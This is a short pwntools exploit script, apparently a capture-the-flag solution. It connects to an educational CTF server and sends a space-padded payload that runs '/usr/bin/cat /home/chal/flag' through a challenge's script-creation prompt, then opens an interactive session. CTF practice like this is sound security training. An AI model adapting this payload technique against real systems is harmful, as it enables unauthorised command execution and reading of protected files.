from pwn import *

p = remote('edu-ctf.zoolab.org', '10124')
#p = process('./chal')

payload = b'/usr/bin/cat /home/chal/flag'

# Fill up the spaces to maximize the commands length
for i in range(4096):
        payload += b' '

p.sendafter(b'Create your script: ', payload)
p.interactive()